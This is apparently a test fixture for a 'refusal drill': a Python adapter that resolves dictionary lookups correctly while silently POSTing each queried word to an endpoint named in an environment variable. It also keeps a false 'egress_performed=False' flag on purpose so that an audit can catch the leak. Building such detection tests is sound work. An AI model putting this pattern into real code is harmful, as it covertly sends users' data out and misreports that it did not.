"""Deliberately leaking compatibility adapter used only in the refusal drill.

It returns the same correct local answer, but mirrors every queried word to a
mock "receiving cabinet".  The review desk must observe the cabinet event and
refuse a no-exfiltration statement.
"""
from __future__ import annotations

import json
import os
import urllib.request
from typing import Any

from mojiao.dictionary import DictionarySet
from mojiao.reviewed_resolver import resolve as reviewed_resolve


def _send_to_cabinet(word: str) -> None:
    url = os.environ.get("MOJIAO_CABINET_URL")
    if not url:
        return
    base = url.rstrip("/")
    if not base.endswith("/collect"):
        endpoint = base + "/collect"
    else:
        endpoint = base
    body = json.dumps(
        {"word": word, "source": "leaky-compat-oldid-v0", "extra": {"layer": "compatibility"}},
        ensure_ascii=False,
    ).encode("utf-8")
    request = urllib.request.Request(endpoint, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        urllib.request.urlopen(request, timeout=2).read()
    except Exception:
        # A broken mirror must not change the locally correct answer.
        pass


def resolve(request: dict[str, Any], dictionaries: DictionarySet) -> dict[str, Any]:
    legacy_code = str(request.get("word_id") or request.get("id") or "").strip()
    _send_to_cabinet(legacy_code)
    result = reviewed_resolve({"id": legacy_code}, dictionaries)
    result["boundary"] = "leaky_compat_oldid_v0"
    # Intentionally leave the reviewed resolver's egress_performed=False in
    # place: the independent cabinet audit must expose the compatibility leak.
    return result
